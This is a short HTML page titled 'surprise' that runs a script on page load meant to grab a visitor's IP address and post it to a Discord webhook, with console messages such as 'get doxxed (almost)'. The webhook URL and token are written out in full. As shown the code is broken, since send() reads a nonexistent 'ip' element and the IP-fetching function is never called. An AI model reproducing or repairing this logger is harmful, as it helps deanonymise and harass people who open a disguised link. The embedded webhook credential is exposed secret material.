<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>surprise</title>
</head>
<body onload="send()">
    <script>
        function get(){
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        var response = JSON.parse(xhr.responseText);
                        var IP = response.ip;
                        console.log(IP);
                    } else {
                        console.error('Failed to fetch IP address');
                    }
                }
            }
            xhr.open('GET', 'https://api.ipify.org?format=json', true);
            xhr.send();
        }

        function send(){
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://discordapp.com/api/webhooks/1229927489967751198/guXBZknaiY2gC8kfirSMr4B0s-NIqY1LEUkbrftkwkilOzfYAwytRBbzGq2FK6kQ-BMj', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        console.log('get doxxed (almost)');
                    } else {
                        console.error('almost had you');
                    }
                }
            };
            var IP = "IP Address: " + document.getElementById('ip').textContent;
            var data = JSON.stringify({content: IP});
            xhr.send(data);
        }
    </script>
</body>
</html>
